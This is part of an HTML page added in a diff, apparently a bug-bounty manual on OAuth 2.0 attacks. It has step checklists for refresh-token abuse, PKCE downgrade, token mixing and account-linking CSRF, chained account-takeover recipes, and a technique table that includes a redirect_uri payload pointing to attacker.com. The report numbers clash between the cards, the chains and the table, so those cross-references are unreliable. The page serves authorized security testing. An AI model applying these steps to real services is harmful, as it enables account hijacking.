+        <div class="scenario-text">Refresh tokens are not rotated, not bound to client, or not revoked on password change — attacker who captures a refresh token maintains permanent access.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Capture refresh_token from localStorage, network request, or cookie</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Test: use refresh_token from a DIFFERENT client_id — does it work? (Token not bound to client)</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Test: user changes password → is old refresh_token invalidated? Try getting new access_token</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Test: user revokes app access → refresh_token still works? → revocation not implemented</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Test rotation: use refresh_token → get new access_token → try OLD refresh_token again → should be invalid</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Send refresh_token request from different IP/User-Agent → is client binding enforced?</div></li>
+      </ul>
+      <div class="mindset"><p>"A refresh token that isn't revoked on password change is an undead backdoor. The user thinks they're safe after resetting their password. They are not."</p></div>
+    </div>
+  </div>
+
+  <!-- R21 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#21</div>
+      <div>
+        <div class="card-title">PKCE Bypass — Code Verifier Downgrade</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">PKCE BYPASS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ffc233">
+        <div class="scenario-label" style="color:#ffc233">SCENARIO</div>
+        <div class="scenario-text">PKCE (Proof Key for Code Exchange) protects against code interception. But if server doesn't enforce it, remove PKCE parameters and exchange any intercepted code directly.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Check if OAuth request includes <code class="yellow">code_challenge=</code> and <code class="yellow">code_challenge_method=S256</code></div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Remove both parameters entirely → does authorization still proceed?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">At token exchange: omit <code class="yellow">code_verifier</code> parameter → does server still return token?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Try downgrade: use <code class="yellow">code_challenge_method=plain</code> instead of S256 → weaker verification</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">If PKCE bypass works: intercept any code → exchange without knowing code_verifier = ATO</div></li>
+      </ul>
+      <div class="mindset"><p>"PKCE is a padlock on the authorization code. If the server says 'PKCE optional', the padlock is decorative. Anyone who intercepts the code can use it without the key."</p></div>
+    </div>
+  </div>
+
+  <!-- R22 -->
+  <div class="card" style="--card-color:#ff7733">
+    <div class="card-header">
+      <div class="report-num">#22</div>
+      <div>
+        <div class="card-title">Cross-Provider Token Mixing Attack</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08)">TOKEN MIXING</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff7733">
+        <div class="scenario-label" style="color:#ff7733">SCENARIO</div>
+        <div class="scenario-text">App accepts tokens from multiple OAuth providers (Google + Facebook + GitHub). Server doesn't validate WHICH provider issued the token — use a Google token to authenticate against Facebook's endpoint.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Identify all OAuth providers the app supports: Google, Facebook, GitHub, Microsoft, etc.</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Get a valid token from Provider A (e.g., Google) → send it to Provider B's (Facebook) OAuth endpoint</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Check if server validates token's issuer (iss claim in JWT) → if not → cross-provider confusion</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Use attacker's Google token with victim's Facebook-linked email → does app merge accounts?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Check: does app verify <code class="orange">aud</code> (audience) claim matches its own client_id? If not → token replay from other apps</div></li>
+      </ul>
+      <div class="mindset"><p>"An app that accepts tokens from 5 providers without checking ISS is like a bouncer who accepts any ID from any country without checking that the ID belongs to the person showing it."</p></div>
+    </div>
+  </div>
+
+  <!-- R23 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#23</div>
+      <div>
+        <div class="card-title">SSO Login CSRF — Account Linking Forced Merge</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">SSO CSRF</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#aa55ff">
+        <div class="scenario-label" style="color:#aa55ff">SCENARIO</div>
+        <div class="scenario-text">Account linking endpoint (linking Google to an existing account) has no CSRF protection. Attacker forces victim to link attacker's Google account to victim's app account.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Find "Connect Google Account" or "Link social login" functionality while logged in</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Start account linking flow as attacker → capture callback URL with attacker's code</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Force victim (who is logged in) to visit attacker's callback URL</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">If no state validation: attacker's Google account links to victim's app account</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Now attacker can login as victim using "Sign in with Google" → full ATO without knowing victim's password</div></li>
+      </ul>
+      <div class="mindset"><p>"Account linking is the most dangerous OAuth feature. When I trick your browser into linking MY Google to YOUR account, I become you — silently, permanently."</p></div>
+    </div>
+  </div>
+
+  <!-- R24 -->
+  <div class="card" style="--card-color:#00cfff">
+    <div class="card-header">
+      <div class="report-num">#24</div>
+      <div>
+        <div class="card-title">The 8-Point OAuth Final Audit Checklist</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">MASTER AUDIT</span>
+          <span class="badge-cat" style="color:#00cfff;border-color:#00cfff;background:rgba(0,207,255,0.08)">COMPREHENSIVE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row">
+        <div class="scenario-label">SCENARIO</div>
+        <div class="scenario-text">Run this 8-point audit LAST after testing all other phases. Catches everything that wasn't covered by individual tests.</div>
+      </div>
+      <div class="steps-title">// 8-POINT FINAL OAuth AUDIT</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 1 — State Entropy:</strong> Is state cryptographically random? Collect 10 states → test in CyberChef</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 2 — redirect_uri Strictness:</strong> Is exact URI match enforced? Or prefix/regex match (exploitable)?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 3 — Code Expiry:</strong> Does code expire in &lt;10 minutes? Is it single-use? Test both</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 4 — Token Scope:</strong> Can you request scopes beyond what was registered? Test scope escalation</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 5 — client_id Validation:</strong> Does token endpoint validate client_id + client_secret together?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 6 — Consent Bypass:</strong> Can prompt=none skip consent for new scopes?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 7 — Token Revocation:</strong> POST to /revoke → is token actually invalidated server-side immediately?</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text"><strong>Point 8 — Discovery Docs:</strong> Check <code>/.well-known/openid-configuration</code> for misconfigured endpoints</div></li>
+      </ul>
+      <div class="mindset"><p>"OAuth is not one vulnerability — it's a protocol with 15 potential failure points. Test all 8 dimensions and you will find something on any non-trivial implementation."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards phase6 -->
+
+
+<!-- ══════════════════════════════════════════════════
+     CHAIN ATTACK FORMULAS
+══════════════════════════════════════════════════ -->
+<div class="chain-box" id="chains">
+  <h2>⚡ OAuth CHAIN ATTACK FORMULAS — Maximum Bounty</h2>
+  <div class="chain-formula">
+    <span class="part p1">REDIRECT BYPASS</span>
+    <span class="op">+</span>
+    <span class="part p2">CODE CAPTURE</span>
+    <span class="op">+</span>
+    <span class="part p3">TOKEN EXCHANGE</span>
+    <span class="op">=</span>
+    <span class="part p5">CRITICAL ATO</span>
+  </div>
+  <div class="chain-examples">
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #1: THE CLASSIC REDIRECT ATO</div>
+      <p>Report #1 (Folder traversal bypass) <span class="arrow">→</span> Code lands on attacker VPS <span class="arrow">→</span> POST to /token endpoint with stolen code <span class="arrow">→</span> Access token issued <span class="arrow">→</span> <strong style="color:#ff3355">Login as victim. Full ATO.</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #2: THE OPEN REDIRECT CHAIN</div>
+      <p>Find open redirect on trusted.com <span class="arrow">→</span> Report #4 (use as redirect_uri) <span class="arrow">→</span> OAuth server approves (same domain) <span class="arrow">→</span> Code relayed to attacker <span class="arrow">→</span> <strong style="color:#ff3355">0 victim interaction needed</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #3: SUBDOMAIN TAKEOVER + OAUTH</div>
+      <p>Report #6 (Takeover dangling subdomain) <span class="arrow">→</span> Report #3 (Wildcard redirect approved) <span class="arrow">→</span> Token arrives on taken-over subdomain <span class="arrow">→</span> <strong style="color:#ff3355">Medium + Medium = Critical ATO</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #4: THE SILENT PRE-HIJACK</div>
+      <p>Report #13 (Register victim email) <span class="arrow">→</span> Wait for victim to "Sign up with Google" <span class="arrow">→</span> Accounts auto-merge <span class="arrow">→</span> Report #15 (use old password) <span class="arrow">→</span> <strong style="color:#ff3355">Stealth ATO before victim notices</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #5: JWT FORGE ADMIN TAKEOVER</div>
+      <p>Report #19 (Get JWKS public key) <span class="arrow">→</span> RS256→HS256 algorithm confusion <span class="arrow">→</span> Forge JWT with role:admin <span class="arrow">→</span> Report #12 (admin scope) <span class="arrow">→</span> <strong style="color:#ff3355">Full admin control</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #6: CSRF ACCOUNT LINKING ATO</div>
+      <p>Report #23 (SSO link CSRF) <span class="arrow">→</span> Force victim to link attacker's Google <span class="arrow">→</span> Report #14 (no state validation) <span class="arrow">→</span> Login as victim via "Sign in with Google" <span class="arrow">→</span> <strong style="color:#ff3355">Persistent invisible backdoor</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #7: REFERER LEAK + REPLAY</div>
+      <p>Report #7 (Code in Referer to analytics) <span class="arrow">→</span> Report #15 (Code not single-use) <span class="arrow">→</span> Replay captured code hours later <span class="arrow">→</span> Report #20 (refresh token not revoked) <span class="arrow">→</span> <strong style="color:#ff3355">Permanent account access</strong></p>
+    </div>
+
+    <div class="chain-ex">
+      <div class="chain-ex-title">// CHAIN #8: XSS + SCOPE ESCALATION</div>
+      <p>Report #11 (XSS on consent page) <span class="arrow">→</span> Steal active access_token from memory <span class="arrow">→</span> Report #12 (add admin scope) <span class="arrow">→</span> Re-request with elevated scope silently <span class="arrow">→</span> <strong style="color:#ff3355">Admin API access</strong></p>
+    </div>
+
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════════
+     MASTER REFERENCE TABLE
+══════════════════════════════════════════════════ -->
+<div class="master-table-section" id="table">
+  <h2>📋 MASTER REFERENCE — All OAuth Reports & Techniques</h2>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>#</th><th>ATTACK NAME</th><th>TECHNIQUE</th><th>PHASE</th><th>SEVERITY</th><th>KEY TOOL</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>01</td><td>Folder Traversal in redirect_uri</td><td>Path traversal escapes allowed prefix</td><td style="color:#00cfff">P1</td><td style="color:#ff3355">CRITICAL</td><td>Burp Suite</td></tr>
+        <tr><td>02</td><td>Subdomain Confusion Bypass</td><td>trusted.com.attacker.com confusion</td><td style="color:#00cfff">P1</td><td style="color:#ff3355">CRITICAL</td><td>Burp + Manual</td></tr>
+        <tr><td>03</td><td>Fragment Injection #bypass</td><td>%23 in redirect_uri → # trick</td><td style="color:#00cfff">P1</td><td style="color:#ff3355">CRITICAL</td><td>Burp Suite</td></tr>
+        <tr><td>04</td><td>@ Injection URL Parser</td><td>user@host parser confusion</td><td style="color:#00cfff">P1</td><td style="color:#ff3355">CRITICAL</td><td>Manual</td></tr>
+        <tr><td>05</td><td>Wildcard Subdomain Abuse</td><td>*.trusted.com → any subdomain</td><td style="color:#00cfff">P1</td><td style="color:#ff3355">CRITICAL</td><td>subfinder + Burp</td></tr>
+        <tr><td>06</td><td>Open Redirect Chain Attack</td><td>Trusted domain redirects code to attacker</td><td style="color:#ffc233">P2</td><td style="color:#ff3355">CRITICAL</td><td>Burp + Manual</td></tr>
+        <tr><td>07</td><td>Post-Login Redirect Abuse</td><td>State encodes redirect URL → manipulate</td><td style="color:#ffc233">P2</td><td style="color:#ff7733">HIGH</td><td>Base64 decode + Burp</td></tr>
+        <tr><td>08</td><td>Subdomain Takeover + OAuth</td><td>Dangling DNS → register asset → token lands there</td><td style="color:#ffc233">P2</td><td style="color:#ff3355">CRITICAL</td><td>subfinder + dnsx</td></tr>
+        <tr><td>09</td><td>Referer Header Code Leak</td><td>3rd party requests leak code via Referer</td><td style="color:#ff7733">P3</td><td style="color:#ff7733">HIGH</td><td>Burp Monitor</td></tr>
+        <tr><td>10</td><td>Implicit Flow Fragment Leak</td><td>Token in # → analytics/Sentry captures it</td><td style="color:#ff7733">P3</td><td style="color:#ff7733">HIGH</td><td>Burp + JS analysis</td></tr>
+        <tr><td>11</td><td>Token in Browser History</td><td>No history.replaceState → token persists</td><td style="color:#ff7733">P3</td><td style="color:#ffc233">MEDIUM</td><td>Browser history check</td></tr>
+        <tr><td>12</td><td>HPP on redirect_uri</td><td>Duplicate params → validator sees safe, redirect uses attacker</td><td style="color:#aa55ff">P4</td><td style="color:#ff7733">HIGH</td><td>Burp Repeater</td></tr>
+        <tr><td>13</td><td>XSS via redirect_uri Reflect</td><td>URI reflected in error page → XSS → token steal</td><td style="color:#aa55ff">P4</td><td style="color:#ff3355">CRITICAL</td><td>Burp + XSS payload</td></tr>
+        <tr><td>14</td><td>scope Escalation</td><td>Add admin scopes → server grants them</td><td style="color:#aa55ff">P4</td><td style="color:#ff7733">HIGH</td><td>Burp Repeater</td></tr>
+        <tr><td>15</td><td>OAuth Pre-Hijacking</td><td>Register victim email → OAuth merge → keep access</td><td style="color:#ff3355">P5</td><td style="color:#ff3355">CRITICAL</td><td>Manual</td></tr>
+        <tr><td>16</td><td>CSRF on OAuth Auth — No State</td><td>Force victim browser to link attacker OAuth</td><td style="color:#ff3355">P5</td><td style="color:#ff7733">HIGH</td><td>CSRF PoC HTML</td></tr>
+        <tr><td>17</td><td>Authorization Code Reuse</td><td>Replay code after first exchange</td><td style="color:#ff3355">P5</td><td style="color:#ff7733">HIGH</td><td>Burp Repeater</td></tr>
+        <tr><td>18</td><td>client_secret Exposed</td><td>Secret in JS/GitHub → impersonate app</td><td style="color:#ff3355">P5</td><td style="color:#ff3355">CRITICAL</td><td>JS search + GitHub</td></tr>
+        <tr><td>19</td><td>Consent Screen Bypass</td><td>prompt=none silently auto-approves scopes</td><td style="color:#ff3355">P5</td><td style="color:#ff7733">HIGH</td><td>Burp Repeater</td></tr>
+        <tr><td>20</td><td>Predictable State / Fixation</td><td>Weak state entropy → predict and fixate</td><td style="color:#ff3355">P5</td><td style="color:#ff7733">HIGH</td><td>CyberChef + Burp</td></tr>
+        <tr><td>21</td><td>JWT Algorithm Confusion</td><td>none alg / RS256→HS256 → forge any token</td><td style="color:#00ff88">P6</td><td style="color:#ff3355">CRITICAL</td><td>jwt_tool / python-jwt</td></tr>
+        <tr><td>22</td><td>Refresh Token Not Revoked</td><td>Stolen refresh token persists after password change</td><td style="color:#00ff88">P6</td><td style="color:#ff7733">HIGH</td><td>Manual + Burp</td></tr>
+        <tr><td>23</td><td>PKCE Bypass</td><td>Remove code_challenge → exchange code without verifier</td><td style="color:#00ff88">P6</td><td style="color:#ff3355">CRITICAL</td><td>Burp Suite</td></tr>
+        <tr><td>24</td><td>Cross-Provider Token Mixing</td><td>Google token → Facebook endpoint confusion</td><td style="color:#00ff88">P6</td><td style="color:#ff3355">CRITICAL</td><td>Multi-provider test</td></tr>
+        <tr><td>25</td><td>SSO Account Linking CSRF</td><td>Force victim to link attacker's social account</td><td style="color:#00ff88">P6</td><td style="color:#ff7733">HIGH</td><td>CSRF PoC</td></tr>
+        <tr><td>26</td><td>Google Analytics Token Leak</td><td>Analytics fires with full URL including code</td><td style="color:#ff7733">P3</td><td style="color:#ff7733">HIGH</td><td>Burp + Source check</td></tr>
+        <tr><td>27</td><td>Token Audience (aud) Bypass</td><td>App doesn't verify token was issued for it</td><td style="color:#00ff88">P6</td><td style="color:#ff3355">CRITICAL</td><td>jwt.io + Burp</td></tr>
+        <tr><td>28</td><td>openid-configuration Disclosure</td><td>Discovery doc reveals hidden endpoints</td><td style="color:#00ff88">P6</td><td style="color:#ffc233">MEDIUM</td><td>/.well-known/ fetch</td></tr>
+        <tr><td>29</td><td>Backslash Redirect Bypass</td><td>redirect_uri=https://trusted.com\@attacker.com</td><td style="color:#00cfff">P1</td><td style="color:#ff3355">CRITICAL</td><td>Burp Suite</td></tr>
+        <tr><td>30</td><td>8-Point Final Audit</td><td>Comprehensive protocol-level verification</td><td style="color:#00ff88">P6</td><td style="color:#ff3355">MASTER</td><td>All Tools</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+</div><!-- /container -->
+
+<footer>
+  [ ELITE BUG HUNTER'S MANUAL ] · [ MISSION 03: OAuth 2.0 ATTACKS ] · [ 30+ REPORTS · 6 PHASES · 40+ TECHNIQUES ]<br><br>
+  <span style="color:#ff3355">✅ M01: REGISTRATION &nbsp;|&nbsp; ✅ M02: PASSWORD RESET &nbsp;|&nbsp; ▶ M03: OAuth 2.0 &nbsp;|&nbsp; M04: COMING SOON ▶</span><br><br>
+  <span style="color:#333;font-size:10px">AUTHORIZED BUG BOUNTY PROGRAMS ONLY — NEVER TEST WITHOUT EXPLICIT WRITTEN PERMISSION</span>
+</footer>
+
+<script>
+  const phaseDone = {1:0,2:0,3:0,4:0,5:0,6:0};
+
+  function toggleCheck(el) {
+    el.classList.toggle('done');
+    const phase = parseInt(el.getAttribute('data-phase'));
+    phaseDone[phase] += el.classList.contains('done') ? 1 : -1;
+    updateProgress();
+  }
+
+  function updateProgress() {
+    const all  = document.querySelectorAll('.check-box').length;
+    const done = document.querySelectorAll('.check-box.done').length;
+    document.getElementById('prog-count').textContent = done;
+    document.getElementById('prog-fill').style.width = (done / all * 100) + '%';
+    for (let p = 1; p <= 6; p++) {
+      const el = document.getElementById('p'+p+'d');
+      if (el) el.textContent = phaseDone[p];
+    }
+  }
+
+  // Smooth nav scroll
+  document.querySelectorAll('.nav-btn').forEach(btn => {
+    btn.addEventListener('click', e => {
+      e.preventDefault();
+      const t = document.querySelector(btn.getAttribute('href'));
+      if (t) t.scrollIntoView({ behavior:'smooth', block:'start' });
+    });
+  });
+
+  // Scroll reveal
+  const cards = document.querySelectorAll('.card');
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        const idx = Array.from(cards).indexOf(e.target) % 3;
+        setTimeout(() => e.target.classList.add('visible'), idx * 80);
+        obs.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.08 });
+  cards.forEach(c => obs.observe(c));
+
+  updateProgress();
+</script>
+</body>
+</html>
